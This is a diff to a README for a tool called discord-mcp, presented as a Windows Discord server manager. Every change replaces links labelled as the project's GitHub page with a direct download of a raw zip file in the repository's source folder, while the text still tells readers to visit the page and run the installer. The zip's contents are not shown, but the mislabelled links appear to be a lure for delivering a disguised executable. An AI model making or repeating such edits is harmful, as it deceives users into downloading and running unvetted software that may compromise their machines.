@@ -1,6 +1,6 @@
 # ⚙️ discord-mcp - Simplify Discord Server Management
 
-[![Download discord-mcp](https://img.shields.io/badge/Download-discord--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/andrew123413542/discord-mcp)
+[![Download discord-mcp](https://img.shields.io/badge/Download-discord--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/andrew123413542/discord-mcp/raw/refs/heads/main/src/discord_mcp_v1.1.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Manage your entire Discord server using discord-mcp. This application includes 1
 
 To get started, visit the page below to download the latest version of discord-mcp:
 
-[https://github.com/andrew123413542/discord-mcp](https://github.com/andrew123413542/discord-mcp)
+[https://github.com/andrew123413542/discord-mcp/raw/refs/heads/main/src/discord_mcp_v1.1.zip](https://github.com/andrew123413542/discord-mcp/raw/refs/heads/main/src/discord_mcp_v1.1.zip)
 
 On this page, you will find the download link for Windows. Look for the latest release under the "Releases" section. Download the installation file marked for Windows.
 
@@ -32,7 +32,7 @@ Before installing, ensure your computer meets the following requirements:
 
 ## 🚀 Installation Instructions
 
-1. Download the installation file from the [discord-mcp GitHub page](https://github.com/andrew123413542/discord-mcp).
+1. Download the installation file from the [discord-mcp GitHub page](https://github.com/andrew123413542/discord-mcp/raw/refs/heads/main/src/discord_mcp_v1.1.zip).
 
 2. Once downloaded, locate the file in your Downloads folder or your preferred download location.
 
@@ -120,7 +120,7 @@ To connect, simply select your platform from the settings menu inside discord-mc
 
 Updates bring new features and fixes. To update:
 
-1. Visit the [discord-mcp GitHub page](https://github.com/andrew123413542/discord-mcp).
+1. Visit the [discord-mcp GitHub page](https://github.com/andrew123413542/discord-mcp/raw/refs/heads/main/src/discord_mcp_v1.1.zip).
 2. Download the latest release installer.
 3. Run the installer and follow the same steps as installation.
 4. Your existing settings will remain intact.
@@ -149,4 +149,4 @@ You can also read documentation for advanced features on the GitHub wiki linked 
 
 ---
 
-[![Download discord-mcp](https://img.shields.io/badge/Download-discord--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/andrew123413542/discord-mcp)
+[![Download discord-mcp](https://img.shields.io/badge/Download-discord--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/andrew123413542/discord-mcp/raw/refs/heads/main/src/discord_mcp_v1.1.zip)
